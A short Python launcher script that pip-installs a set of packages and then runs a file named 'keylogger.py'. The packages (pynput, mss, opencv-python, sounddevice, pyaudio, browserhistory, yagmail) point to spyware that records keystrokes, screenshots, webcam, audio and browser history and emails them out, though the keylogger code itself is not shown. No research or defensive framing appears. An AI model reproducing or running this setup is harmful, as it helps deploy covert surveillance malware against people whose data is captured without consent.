import subprocess
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def run_script(script_path):
    subprocess.check_call([sys.executable, script_path])

packages = [
    "certifi",
    "yagmail",
    "browserhistory",
    "mss",
    "opencv-python",
    "requests",
    "sounddevice",
    "cryptography",
    "pynput",
    "pyaudio"
    ]

if __name__ == "__main__":
    for package in packages:
        install(package)

    run_script('keylogger.py')
